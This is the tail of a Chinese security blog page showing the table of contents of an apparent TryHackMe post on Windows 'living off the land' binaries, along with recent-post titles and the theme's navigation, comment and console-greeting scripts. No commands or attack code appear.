href="#0x03-lolbas-%E9%A1%B9%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">0x03 LOLBAS 项目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFlolbas"><span class="toc-number">3.1.</span> <span class="toc-text">什么是LOLBAS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E6%A0%87%E5%87%86"><span class="toc-number">3.2.</span> <span class="toc-text">工具标准</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%89%E8%B6%A3%E7%9A%84%E5%8A%9F%E8%83%BD"><span class="toc-number">3.3.</span> <span class="toc-text">有趣的功能</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">4.</span> <span class="toc-text">0x04 文件操作</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#certutil"><span class="toc-number">4.1.</span> <span class="toc-text">Certutil</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bitsadmin"><span class="toc-number">4.2.</span> <span class="toc-text">BITSAdmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#findstr"><span class="toc-number">4.3.</span> <span class="toc-text">FindStr</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">5.</span> <span class="toc-text">0x05 文件执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#file-explorer"><span class="toc-number">5.1.</span> <span class="toc-text">File Explorer</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmic"><span class="toc-number">5.2.</span> <span class="toc-text">WMIC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rundll32"><span class="toc-number">5.3.</span> <span class="toc-text">Rundll32</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">6.</span> <span class="toc-text">0x06 应用程序白名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E7%99%BD%E5%90%8D%E5%8D%95"><span class="toc-number">6.1.</span> <span class="toc-text">绕过应用程序白名单</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#regsvr32"><span class="toc-number">6.2.</span> <span class="toc-text">Regsvr32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bourne-again-shell-bash"><span class="toc-number">6.3.</span> <span class="toc-text">Bourne Again Shell (Bash)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%85%B6%E4%BB%96%E6%8A%80%E6%9C%AF"><span class="toc-number">7.</span> <span class="toc-text">0x07 其他技术</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#shortcuts-%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F"><span class="toc-number">7.1.</span> <span class="toc-text">Shortcuts 快捷方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#no-powershell"><span class="toc-number">7.2.</span> <span class="toc-text">No PowerShell!</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E7%9C%9F%E5%AE%9E%E5%9C%BA%E6%99%AF"><span class="toc-number">8.</span> <span class="toc-text">0x08 真实场景</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%BB%93%E8%AE%BA"><span class="toc-number">9.</span> <span class="toc-text">0x09 结论</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%B5%84%E6%BA%90"><span class="toc-number">9.1.</span> <span class="toc-text">其他资源</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>